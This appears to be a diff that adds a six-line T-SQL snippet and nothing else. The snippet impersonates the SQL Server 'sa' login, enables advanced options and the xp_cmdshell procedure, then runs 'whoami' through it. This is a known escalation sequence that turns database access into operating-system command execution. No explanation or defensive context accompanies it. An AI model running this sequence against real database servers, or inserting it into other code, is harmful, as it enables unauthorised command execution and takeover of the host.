@@ -1,0 +1,6 @@
+execute as login = 'sa'
+execute sp_configure 'show advanced options', '1'
+RECONFIGURE
+execute sp_configure 'xp_cmdshell', '1'
+RECONFIGURE
+execute xp_cmdshell "whoami"
